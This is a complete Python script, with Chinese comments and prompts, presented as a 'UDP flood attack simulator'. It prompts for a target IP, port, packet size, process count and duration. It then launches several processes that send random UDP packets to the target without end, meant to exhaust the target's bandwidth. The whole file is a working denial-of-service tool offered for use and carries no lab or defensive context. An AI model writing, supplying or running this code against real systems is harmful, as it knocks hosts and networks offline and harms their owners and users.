import socket
import random
import time
import os
from multiprocessing import Process, cpu_count

# ==============================================================================
# 核心功能模块
# ==============================================================================

def get_user_input(prompt, default_value, value_type=str):
    """
    一个通用的函数，用于获取用户输入，并提供默认值和类型转换。
    """
    while True:
        user_input = input(f"{prompt} (默认为: {default_value}): ").strip()
        if not user_input:
            return default_value
        try:
            return value_type(user_input)
        except ValueError:
            print(f"输入无效，请输入一个有效的 {value_type.__name__} 类型的值。")

def flood_worker(target_ip, target_port, packet_size):
    """
    攻击工作单元，在独立的进程中运行。
    """
    # 创建一个UDP套接字
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    # 生成随机数据包
    data = random._urandom(packet_size)
    print(f"进程 {os.getpid()} 已启动，开始向 {target_ip}:{target_port} 发送数据包...")
    
    while True:
        try:
            # 循环发送数据
            sock.sendto(data, (target_ip, target_port))
        except Exception:
            # 在高负载下可能会出错，忽略并继续
            pass

# ==============================================================================
# 主程序入口
# ==============================================================================

if __name__ == "__main__":
    print("--- UDP 洪水攻击模拟器 (交互模式) ---")
    print("此工具通过发送大量UDP数据包来消耗目标的网络带宽。")
    print("-" * 40)

    # 1. 获取用户输入的参数
    target_ip = get_user_input("请输入目标IP地址", "target")
    target_port = get_user_input("请输入目标端口", 80, int)
    packet_size = get_user_input("请输入每个数据包的大小 (bytes)", 1024, int)
    process_count = get_user_input("请输入要启动的攻击进程数", cpu_count(), int)
    duration = get_user_input("请输入攻击持续时间 (秒, 0为无限)", 60, int)

    print("-" * 40)
    print("攻击参数确认:")
    print(f"  - 目标: {target_ip}:{target_port}")
    print(f"  - 包大小: {packet_size} 字节")
    print(f"  - 进程数: {process_count}")
    print(f"  - 持续时间: {'无限' if duration == 0 else f'{duration} 秒'}")
    print("-" * 40)

    confirm = input("确认开始攻击? (y/n): ").lower()
    if confirm != 'y':
        print("攻击已取消。")
        exit()

    # 2. 启动攻击进程
    processes = []
    print(f"正在启动 {process_count} 个攻击进程...")
    for _ in range(process_count):
        p = Process(target=flood_worker, args=(target_ip, target_port, packet_size))
        p.start()
        processes.append(p)

    # 3. 管理攻击时长并结束
    try:
        if duration > 0:
            print(f"攻击将持续 {duration} 秒... 按 Ctrl+C 可提前终止。")
            time.sleep(duration)
        else:
            print("攻击已开始，将无限期运行... 按 Ctrl+C 终止。")
            while True:
                time.sleep(1)
    except KeyboardInterrupt:
        print("\n检测到手动中断...")
    finally:
        print("正在停止所有攻击进程...")
        for p in processes:
            p.terminate()
            p.join()
        print("所有攻击进程已停止。程序退出。")

